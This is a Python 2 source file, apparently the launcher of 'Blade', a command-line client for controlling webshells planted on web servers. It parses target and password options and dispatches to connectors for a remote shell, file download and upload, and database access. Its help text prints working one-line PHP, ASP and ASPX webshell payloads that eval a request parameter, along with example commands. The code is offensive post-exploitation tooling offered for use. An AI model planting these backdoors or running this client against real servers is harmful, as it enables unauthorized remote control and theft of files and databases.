#!/usr/bin/env python
# encoding: utf-8

import sys, getopt
from lib.core.connector import Connector
from lib.core.webshellConnector import WebShellConnector
from lib.core.pullConnector import PullConnector
from lib.core.pushConnector import PushConnector
from lib.core.databaseConnector import DatabaseConnector

class Launcher(object):
    """The core class which start the whole app"""

    # App entry point
    # param: none
    # return: none
    @classmethod
    def main(self):
        print '+ Blade (development version)'
        print '------------------------------------------------------------'
        config = self.getConfig()
        if self.configIsError(config):
            print '- Error: Parameters are not correct'
            print ''
            self.printHelp()
            return
        connector = self.getConnector(config)
        connector.launch()

    # Print the help text to screen
    # param: none
    # return: none
    @classmethod
    def printHelp(self):
        print 'Help messages:'
        print '  -u+        Specify the target URL'
        print '  -s+        Specify the type of server: php/asp/aspx/jsp'
        print '  -p+        Connection password (Command parameter name)'
        print '  -t 7       Connection timeout in sec (default: 7 sec)'
        print ''
        print '  --shell    Get a web based shell on the console'
        print '  --pull+    Download file to local: -- pull remote_path local_path / --pull remote_path'
        print '  --push+    Upload a file from loacl: --push local_path remote_path'
        print '  --db+      Connect to database: --db mysql'
        print ''
        print 'Examples for using:'
        print '  Get a shell:'
        print '             -u http://localhost/shell.php -s php -p cmd --shell'
        print '  Download a file:'
        print '             -u http://localhost/shell.php -s php -p cmd --pull file1 file2'
        print '  Upload a file:'
        print '             -u http://localhost/shell.php -s php -p cmd --push file1 file2'
        print '  Connect to database:'
        print '             -u http://localhost/shell.php -s php -p cmd --db mysql'
        print ''
        print 'Webshell samples:'
        print '  PHP:       <?php @eval($_REQUEST["cmd"]);?>'
        print '  ASP:       <%eval request("cmd")%>'
        print '  ASPX:      <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
        print ''

    # Get the config Json object from args
    # param: none
    # retuen: config
    @classmethod
    def getConfig(self):
        try:
            opts, args = getopt.getopt(sys.argv[1:], 'u:p:s:t:', ['shell', 'pull', 'push', 'db'])
        except:
            return 'error'
        config = {
            'url': '',
            'password': '',
            'timeout': 7,
            'server': '',
            'shell': False,
            'pull': [],
            'push': [],
            'database': ''
        }
        for option, value in opts:
            if option == '-u':
                config['url'] = value
            elif option == '-p':
                config['password'] = value
            elif option == '-t':
                config['timeout'] = int(value)
            elif option == '-s':
                config['server'] = value
            elif option == '--shell':
                config['shell'] = True
            elif option == '--pull':
                config['pull'] = args
            elif option == '--push':
                config['push'] = args
            elif option == '--db':
                config['database'] = args[0]
        return config

    # Check if the Json object config has any errors
    # param: config
    # return: bool
    @classmethod
    def configIsError(self, config):
        if config == 'error':
            return True
        else:
            if config['url'] == '' or config['password'] == '' or config['server'] == '':
                return True
            elif config['shell'] == True and len(config['pull']) == 0 and len(config['push']) == 0 and config['database'] == '':
                return False
            elif config['shell'] == False and len(config['pull']) == 2 and len(config['push']) == 0 and config['database'] == '':
                return False
            elif config['shell'] == False and len(config['pull']) == 1 and len(config['push']) == 0 and config['database'] == '':
                return False
            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 2 and config['database'] == '':
                return False
            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 1 and config['database'] == '':
                return False
            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 0 and config['database'] != '':
                return False
            else:
                return True

    # Thie is a factory, to get the instance of opreational object
    # param: config
    # return: connector
    @classmethod
    def getConnector(self, config):
        if config['shell'] == True:
            connector = WebShellConnector(config['url'], config['password'], config['server'], config['timeout'])
        elif len(config['pull']) > 0:
            connector = PullConnector(config['url'], config['password'], config['server'], config['pull'], config['timeout'])
        elif len(config['push']) > 0:
            connector = PushConnector(config['url'], config['password'], config['server'], config['push'], config['timeout'])
        elif config['database'] == 'mysql' or config['database'] == 'sqlserver' or config['database'] == 'oracle' or config['database'] == 'access':
            print '+ Enter database configuration'
            host = raw_input('+ Database host: ')
            userName = raw_input('+ User name: ')
            password = raw_input('+ Password: ')
            print '------------------------------------------------------------'
            if config['database'] == 'oracle':
                db = raw_input('+ Database name: ')
                connector = DatabaseConnector(config['url'], config['password'], config['server'], config['database'], host, userName, password, db)
            else:
                connector = DatabaseConnector(config['url'], config['password'], config['server'], config['database'], host, userName, password)
        else:
            connector = Connector(config['url'], config['password'], config['server'])
        return connector
